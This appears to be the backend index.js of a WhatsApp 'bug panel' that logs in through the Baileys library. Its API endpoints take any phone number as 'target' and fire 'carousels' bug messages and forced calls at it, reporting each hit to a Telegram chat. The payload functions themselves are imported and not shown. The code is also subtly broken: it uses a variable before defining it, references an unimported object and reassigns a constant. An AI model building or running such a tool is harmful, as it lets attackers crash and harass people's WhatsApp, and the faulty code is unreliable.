// index.js (Ini adalah file backend Node.js Anda)

console.clear();  
require('./config'); // Pastikan path ini benar jika config ada di public/settings

console.log('Starting KepfoЯannaS Backend...');  
process.on("uncaughtException", console.error);  
  
const {
    default: makeWASocket,   
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    jidDecode,   
    getContentType,   
    MessageRetryMap, // Perlu diimpor jika digunakan
    relayWAMessage // Perlu diimpor jika digunakan
} = require("@whiskeysockets/baileys");  
  
const pino = require('pino');  
const readline = require("readline");  
const fs = require('fs');  
const express = require("express");  
const bodyParser = require('body-parser');  
const cors = require("cors");  
const path = require("path");    
const { Boom } = require('@hapi/boom');

// --- Konfigurasi Global (Tambahan) ---
// Ganti dengan username Telegram bot Anda dan chat ID Anda
global.telegram_api_token = 'YOUR_TELEGRAM_BOT_API_TOKEN'; // Dapatkan dari @BotFather di Telegram
global.telegram_chat_id = 'YOUR_TELEGRAM_CHAT_ID'; // Chat ID pribadi/grup Anda
global.creator = 'KepfoЯannaS'; // Creator name for API responses

// Import service modules (as per your structure)
// Pastikan path ini benar
const { carousels2, forceCall } = require('./bugs'); // Asumsi ada di public/service/bugs.js
const { getRequest, sendTele } = require('./telegram'); // Asumsi ada di public/engine/telegram.js
const { konek } = require('./connect'); // Asumsi ada di connect.js

const app = express();  
const PORT = process.env.PORT || 5036; // Default port 5036, bisa diubah via env

app.enable("trust proxy");  
app.set("json spaces", 2);  
app.use(cors()); // MENGIZINKAN SEMUA CORS - PENTING UNTUK FRONTEND!
app.use(express.urlencoded({   
  extended: true   
}));  
app.use(express.json());  
// Melayani file statis dari folder public (termasuk index.html, app.js, styles.css)
app.use(express.static(path.join(__dirname, "public")));  
app.use(bodyParser.raw({   
  limit: '50mb',   
  type: '*/*'   
}));  

const usePairingCode = true; // Sesuai dengan konfigurasi Baileys Anda

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,   
        output: process.stdout   
    })
    return new Promise((resolve) => {  
        rl.question(text, resolve);   
    });  
}

async function clientstart() {
    console.log(`Baileys version: ${version}, isLatest: ${isLatest}`);
	const { state, saveCreds } = await useMultiFileAuthState(`./session`);
    const { version, isLatest } = await fetchLatestBaileysVersion();
    
    const client = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: !usePairingCode, // Print QR only if not using pairing code
        auth: state,
        browser: Browsers.macOS('Desktop'), // Menggunakan Browsers dari Baileys
        // Ini adalah MessageRetryMap yang Anda impor di awal
        // messageRetryMap: MessageRetryMap 
    });
      
    if (usePairingCode && !client.authState.creds.registered) {
        const phoneNumber = await question('Please enter your WhatsApp number (e.g., 62812xxxxxx):\n> ');  
        const code = await client.requestPairingCode(phoneNumber.trim()); // Trim whitespace
        console.log(`Your pairing code: ${code}`);  
    }

    // --- API Endpoints for Frontend (Bug Panel) ---
    app.get('/api/bug/carousels', async (req, res) => {
        const { target, fjids } = req.query; // fjids bisa jadi 'ios' atau 'android'
        
        if (!target) return res.status(400).json({
            status: false, 
            message: "Parameter 'target' diperlukan"
        });
        // Jika fjids digunakan sebagai penanda OS
        if (!fjids) return res.status(400).json({
            status: false,  
            message: "Parameter 'fjids' (OS) diperlukan"
        });  

        let formattedTarget = target.replace(/[^0-9]/g, ""); // Hapus non-digit
        if (formattedTarget.startsWith("0")) return res.status(400).json({
            status: false,
            message: "Gunakan awalan kode negara (misal: 62)!"
        });
        
        let jid = formattedTarget + '@s.whatsapp.net';
        const info = await getRequest(req); // Mengambil info request untuk logging/telegram

        try {
            // Panggil fungsi carousels2 dari service/bugs
            // Asumsi carousels2 menerima client dan JID target
            await carousels2(client, jid, fjids); // Melewatkan fjids ke service jika diperlukan
            
            res.json({
                status: true,
                creator: global.creator,
                result: `Successfully sent carousels (pairing code sim.) to ${target} for OS ${fjids}.`
            });
            console.log(`[API] Successfully sent carousels (pairing code sim.) to ${jid}`);

            // Kirim notifikasi ke Telegram (jika global.telegram_api_token & chat_id diset)
            const logMessage = `\n[API HIT]
Endpoint: Carousels (Pairing Code)
Target: ${target}
OS: ${fjids}
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] Carousels: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to send carousels: ${error.message}`
            });
        }
    });  
    
    app.get('/api/bug/forcecall', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({
            status: false,  
            message: "Parameter 'target' diperlukan"
        });

        let formattedTarget = target.replace(/[^0-9]/g, "");
        if (formattedTarget.startsWith("0")) return res.status(400).json({
            status: false,
            message: "Gunakan awalan kode negara (misal: 62)!"
        });
        
        let jid = formattedTarget + '@s.whatsapp.net';
        const info = await getRequest(req);

        try {
            // Panggil fungsi forceCall dari service/bugs
            await forceCall(client, jid);
            
            res.json({
                status: true,
                creator: global.creator,
                result: `Successfully sent forcecall to ${target}.`
            });
            console.log(`[API] Successfully sent forcecall to ${jid}`);

            // Kirim notifikasi ke Telegram
            const logMessage = `\n[API HIT]
Endpoint: Forcecall
Target: ${target}
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] Forcecall: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to send forcecall: ${error.message}`
            });
        }
    });  

    // API Endpoint for "Send No Target" (simulasi)
    app.get('/api/bug/no_target', async (req, res) => {
        const info = await getRequest(req);
        try {
            // Logika simulasi atau pemanggilan fungsi backend yang tidak butuh target
            // Contoh: await someInternalFunction(client);
            
            res.json({
                status: true,
                creator: global.creator,
                result: "Successfully executed 'no target' command."
            });
            console.log(`[API] Executed 'no target' command.`);
            
            const logMessage = `\n[API HIT]
Endpoint: No Target Command
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] No Target: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to execute 'no target' command: ${error.message}`
            });
        }
    });

    // API Endpoint for "Toggle Delay" (simulasi)
    app.get('/api/bug/toggle_delay', async (req, res) => {
        const info = await getRequest(req);
        try {
            // Logika simulasi atau pemanggilan fungsi backend untuk toggle delay
            // Global state atau database untuk delay bot akan diubah di sini
            // Contoh: global.botDelayActive = !global.botDelayActive;

            res.json({
                status: true,
                creator: global.creator,
                result: `Successfully toggled delay.`
            });
            console.log(`[API] Toggled delay command.`);

            const logMessage = `\n[API HIT]
Endpoint: Toggle Delay Command
IP: ${info.ip}
Method: ${info.method}
Timestamp: ${info.timestamp}

This is a part of API monitoring system.`;
            if (global.telegram_api_token && global.telegram_chat_id) {
                sendTele(logMessage);
            }

        } catch (error) {
            console.error(`[API Error] Toggle Delay: ${error.message}`);
            res.status(500).json({
                status: false,
                message: `Failed to toggle delay: ${error.message}`
            });
        }
    });

    // API Endpoint untuk mendapatkan status bot (simulasi, untuk frontend)
    app.get('/api/bot_status', async (req, res) => {
        // Dalam real-world, ini akan mengambil status koneksi Baileys
        // Contoh: const status = client.ws.readyState === WebSocket.OPEN ? 'Online' : 'Offline';
        // Atau status bot dari sistem koneksi Anda
        const realBotStatus = client.user ? 'Online' : 'Offline'; // Lebih realistis
        res.json({
            status: true,
            botOnline: client.user ? true : false,
            message: `Bot is currently ${realBotStatus}.`
        });
    });
   
    // Event listener koneksi Baileys
    client.ev.on('connection.update', (update) => {
        // Gunakan fungsi konek dari connect
        konek({ 
            client, 
            update, 
            clientstart, // Untuk auto-restart/reconnect
            DisconnectReason,
            Boom
        });  
    });  
    
    // Simpan kredensial saat ada update
    client.ev.on('creds.update', saveCreds);  
    
    return client;
}
      
clientstart();

// --- Express Server Startup ---
// Menangani request untuk index.html (frontend)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html')); // Asumsi index.html ada di public folder
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
}).on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} is in use. Trying another port...`);
    const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024); // Random high port
    app.listen(newPort, () => {
      console.log(`Server is running on http://localhost:${newPort}`);
      PORT = newPort; // Update PORT variable if successful
    });
  } else {
    console.error('An error occurred:', err.message);
  }
});

// Watch for file changes (for development)
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {  
  require('fs').unwatchFile(file);  
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m');  
  delete require.cache[file];  
  require(file);  
});